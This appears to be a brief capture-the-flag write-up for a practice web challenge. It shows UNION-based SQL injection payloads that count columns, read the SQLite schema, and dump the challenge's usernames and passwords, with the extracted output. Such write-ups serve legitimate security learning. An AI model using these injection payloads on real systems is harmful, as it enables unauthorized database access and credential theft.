Payload `GET /web-serveur/ch18/?action=news&news_id=1+union+select+null,null,null--` indicate that there are 3 collums in the current table.
```
GET /web-serveur/ch18/?action=news&news_id=1+union+select+null,sql,name+from+sqlite_master--
```
return 
```
CREATE TABLE news(id INTEGER, title TEXT, description TEXT)
news

CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)
users
```

Now I can extract the users table by the payload
```
GET /web-serveur/ch18/?action=news&news_id=1+union+select+null,username,password+from+users--
```
```
admin
aTlkJYLjcbLmue3

user1
vUrpgAsCTX

user2
aFjRKx7j9d
```